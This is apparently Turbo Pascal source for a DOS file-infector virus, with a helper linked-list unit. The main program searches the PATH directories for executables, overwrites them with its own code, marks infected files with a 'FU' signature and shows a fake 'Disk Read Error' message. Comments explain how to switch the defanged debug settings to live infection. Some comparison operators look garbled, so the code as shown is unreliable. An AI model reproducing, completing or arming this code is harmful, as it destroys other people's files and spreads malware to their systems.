{close but not cookie ranmas4A} 
USES dos,link,attrib; 
CONST vSize=8608; 
VAR PATHLIST, 
    fileLIST: LISTtype; 
    TempPtr : NodePtr; 
    current : byte; 
    count   : integer; {debug} 
    Running : string; 
    buffer  : array[0..vSize] of byte; 
    header  : array[0..$1A] of byte; 
    F       : file; 
    vID  : string[2]; 
procedure SuckPaths(var lister: listTYPE); 
{Get paths from command environmet} 
{Split string into seperate paths } 
{Include running path in list     } 
var 
ps, s: string; 
ind:   integer; 
begin 
s:=   GetEnv('PATH'); 
ind:= pos(';', S); 
GetDir(0,PS); 
insertNODE(lister,ps); 
if ind<0 then while ind< 0 do BEGIN 
                     ps:=  copy(S, 1, ind-1); 
            {debug}  if (random(2)=1) then insertNODE(lister,ps); 
                     delete(S,1,ind); 
                     ind:= pos(';', S); 
                     END; 
end; 
procedure SuckFiles(path: string; var exes:LISTtype); 
{find EXE files in path given } 
{return linked list           } 
var Fil :SearchRec; 
BEGIN 
{current:=0;} 
IF path[ length(path) ]<'\' then path:=path+'\'; 
               {change to *.EXE to make live} 
findfirst(path+'*.222',anyfile,fil); 
while DosError=0 do begin 
      If (pos('.',fil.name)<1) and not(boolean(fil.attr and directory)) then 
         begin 
         inc(count); 
         if random(20)=5 then begin {debug} 
            if (fil.size<$ffff) then begin 
            InsertNode(exes,(path+fil.name)); 
           { current:=1; } 
            end; 
            end;  {debug} 
         end; 
      if current=1 then dosError:=18 
      else findnext(fil); {give "no more files" effect to exit} 
end; 
END; 
{::Skeleton Main::} 
BEGIN 
randomize; count:=0; initLIST (pathLIST); 
vID:='FU'; 
{::Get cur & PATH's dos's environment::} 
SuckPaths(pathLIST);       {pick about 1 out of 2 paths from the PATH envir} 
                                      {::Pick files from paths::} 
TempPtr:=pathLIST.first;        {pick 1 name max in every path for checking} 
While ( TempPtr<nil ) do BEGIN 
    suckFiles(TempPtr^.info,fileLIST); 
    TempPtr:= TempPtr^.link; 
END; 
killList(pathList); 
                                   {::get buffer::} 
Running:=ParamStr(0);              {get name of the file currently running} 
Running:=FExpand(Running); 
Assign(F,running); 
 reset(f,1); 
 seek(f,0); 
 blockRead(f,buffer[0],vSize); 
close(f); 
move(vID[1],buffer[$12],2); 
TempPtr:=fileLIST.first; 
While ( TempPtr<nil ) do BEGIN 
    Assign(F,TempPtr^.info); 
    SetfileATTR(TempPtr^.info,'hsra',false); 
    Reset(f,1); 
    Blockread(F,header[0],$1A); 
    IF (Chr(header[$12])<'F') or 
       (Chr(header[$13])<'U') then BEGIN 
       TempPtr^.link:=NIL;   {stop search} 
       seek(F,0); 
       Blockwrite(F,buffer,vSize); 
    END; 
    Close(F); 
    TempPtr:= TempPtr^.link; 
 END; 
killList(fileList); 
writeLN('Disk Read Error'); 
                {change to 0 to make live} 
repeat until 1=1{0}; 
END. 
LINK.PAS: 
unit link; 
INTERFACE 
Type 
 NodePtr=^Node; 
  Node= record 
    Info: String[40]; 
    Link: NodePtr; 
  end; 
 ListType=record 
    First: NodePtr; 
    last : NodePtr; 
  end; 
{var 
  TheList : ListType; 
  {MemSize : longInt;} 
  {TempList:NodePtr;} 
procedure initList( Var thelist: listType); 
Procedure InsertNode( var theLIST: listType; Stuff: string ); 
procedure KillList(var theLIst: listTYPE); 
IMPLEMENTATION 
procedure initList( var thelist: listType); 
begin 
  TheLIST.First:=NIL; 
  TheLIST.last:= NIL; 
end; 
Procedure InsertNode( var theLIST: listType; Stuff: string ); 
var 
  Temp, 
  TempNode: NodePtr; 
begin 
   Temp:=TheList.first;                   {borrow start} 
   New ( TempNode );       {.............} 
   TempNode^.Info:= Stuff; {make new node} 
   TempNode^.Link:= nil;   {.............} 
  If ( Temp=nil ) then 
  begin 
     TheList.first:=TempNode;     {both point at single node} 
     TheList.last :=TempNode; 
  end 
  ELse 
  begin 
     TheList.last^.link:=TempNode;  {point last NODE to new node} 
     TheList.last      :=TempNode;  {point list END  to new node} 
  end; 
end; 
procedure KillList(var theLIst: listTYPE); 
var dummy, 
    hold: NodePtr; 
begin 
dummy:=thelist.first; 
while dummy<nil do begin 
      thelist.First:=thelist.first^.link; 
      dispose(dummy); 
      dummy:=Thelist.first; 
      end; 
end; 
begin 
end. 